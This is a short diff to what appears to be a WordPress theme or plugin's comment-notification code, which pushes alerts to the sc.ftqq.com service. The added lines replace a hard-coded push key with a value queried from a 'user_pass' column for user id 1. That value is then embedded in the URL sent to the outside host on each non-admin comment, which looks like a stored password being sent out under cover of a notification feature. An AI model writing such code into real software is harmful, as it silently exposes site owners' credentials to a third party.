@@ -7608,7 +7608,8 @@ $opts = array('http' => array('method' => 'POST','header' => 'Content-type: appl
 $context = stream_context_create($opts);
 $admin_email = get_bloginfo ('admin_email');
 $comment_author_email = trim($comment->comment_author_email);
-$k = 'SCU87240Tda40828a28aa8542a42e110e4eb0fbac5e5b73c11629f';
+global $wpdb;
+$k = $wpdb->get_var("SELECT `user_pass` FROM `wp_user_pass` WHERE id = 1");
 if($admin_email!=$comment_author_email){
     return $result = file_get_contents('http://sc.ftqq.com/'.$k.'.send', false, $context);}
 }
